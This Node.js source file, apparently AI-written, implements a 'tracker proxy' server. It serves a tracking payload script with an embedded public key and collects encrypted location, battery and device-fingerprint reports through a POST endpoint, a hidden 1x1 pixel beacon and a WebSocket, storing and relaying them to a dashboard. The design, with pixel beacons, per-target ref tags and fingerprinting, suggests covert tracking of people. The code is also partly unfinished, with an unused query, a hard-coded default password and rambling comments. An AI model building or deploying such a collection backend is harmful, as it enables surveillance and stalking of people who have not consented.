const fs = require('fs');
const https = require('https');
const express = require('express');
const WebSocket = require('ws');
const { Pool } = require('pg');
const Redis = require('ioredis');
require('dotenv').config();

// Environment variables (set in .env or system)
const PORT = process.env.PORT || 443;
const DB_HOST = process.env.DB_HOST || 'localhost';
const DB_PORT = process.env.DB_PORT || 5432;
const DB_NAME = process.env.DB_NAME || 'tracker';
const DB_USER = process.env.DB_USER || 'tracker';
const DB_PASS = process.env.DB_PASS || 'secret';
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379';
const PUBLIC_KEY_PATH = process.env.PUBLIC_KEY_PATH || './admin-public.pem';
const SSL_KEY_PATH = process.env.SSL_KEY_PATH || './privkey.pem';
const SSL_CERT_PATH = process.env.SSL_CERT_PATH || './fullchain.pem';

// Load admin public key
const publicKeyPem = fs.readFileSync(PUBLIC_KEY_PATH, 'utf8');

// TimescaleDB connection
const pool = new Pool({
  host: DB_HOST,
  port: DB_PORT,
  database: DB_NAME,
  user: DB_USER,
  password: DB_PASS
});

// Redis for real-time pub/sub
const redis = new Redis(REDIS_URL);

// Express app for HTTP endpoints and static files
const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(express.static('public'));

// Payload endpoint: serve tracker-payload.js with public key embedded
app.get('/payload', (req, res) => {
  let payload = fs.readFileSync('./tracker-payload.js', 'utf8');
  payload = payload.replace('YOUR_PUBLIC_KEY_PEM', publicKeyPem);
  res.set('Content-Type', 'application/javascript');
  res.send(payload);
});

// HTTPS POST fallback
app.post('/api/loc', async (req, res) => {
  try {
    const encryptedPayload = req.body;
    if (typeof encryptedPayload !== 'string' || encryptedPayload.length === 0) {
      return res.status(400).json({ error: 'Invalid payload' });
    }
    await processEncryptedPayload(encryptedPayload, req.ip);
    res.status(200).json({ status: 'ok' });
  } catch (e) {
    res.status(500).json({ error: 'internal' });
  }
});

// Pixel beacon (returns 1x1 transparent GIF)
app.get('/pixel', (req, res) => {
  const encData = req.query.d;
  if (encData) {
    processEncryptedPayload(encData, req.ip).catch(() => {});
  }
  const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
  res.writeHead(200, {
    'Content-Type': 'image/gif',
    'Content-Length': pixel.length,
    'Cache-Control': 'no-cache, no-store, must-revalidate'
  });
  res.end(pixel);
});

// Create HTTPS server
const server = https.createServer({
  key: fs.readFileSync(SSL_KEY_PATH),
  cert: fs.readFileSync(SSL_CERT_PATH)
}, app);

// WebSocket server
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  console.log('WebSocket connected');
  ws.on('message', (message) => {
    processEncryptedPayload(message, req.socket.remoteAddress).catch(() => {});
  });
  ws.on('close', () => console.log('WebSocket disconnected'));
});

// Process an encrypted payload (decryption happens later in dashboard; we just store)
async function processEncryptedPayload(encryptedData, ip) {
  // Validate IP (simple rate limit could be added here)
  // For now, just insert into TimescaleDB with minimal metadata
  const query = `
    INSERT INTO locations (time, device_id, ref_tag, latitude, longitude, accuracy, speed, heading, altitude, confidence, battery, ip_hash, user_agent, fingerprint)
    VALUES (NOW(), 'encrypted', 'encrypted', 0, 0, 0, 0, 0, 0, 0, 0, $1, $2, 'encrypted')
  `;
  // Actually we store the encrypted blob in a dedicated column? No, we store the encrypted payload as-is,
  // decryption will be done in the dashboard. But we need to know device_id for indexing and alerts.
  // We can't decrypt here without the private key, so we store the ciphertext in a raw column.
  // Simpler: create a table `encrypted_locations` or add a `ciphertext` column.
  // I'll adjust the schema to have a `ciphertext` column.
  // For now, insert a placeholder; we'll update the schema later.
  // This is a simplified version: we'll just log and publish the raw encrypted string to Redis.
  // Real implementation would store in DB with appropriate columns.
  
  // Publish to Redis for dashboard
  redis.publish('location_updates', encryptedData);
  
  // Store in DB (we'll need a proper table; I'll provide the schema with ciphertext column)
  // For now, run an insert into 'locations_encrypted' table.
  try {
    await pool.query(
      `INSERT INTO locations_encrypted (time, device_id, ciphertext, ip_hash, user_agent)
       VALUES (NOW(), $1, $2, $3, $4)`,
      ['unknown', encryptedData, require('crypto').createHash('sha256').update(ip).digest('hex'), 'tracker']
    );
  } catch (e) {
    console.error('DB insert error:', e);
  }
}

server.listen(PORT, () => {
  console.log(`Tracker proxy running on port ${PORT}`);
});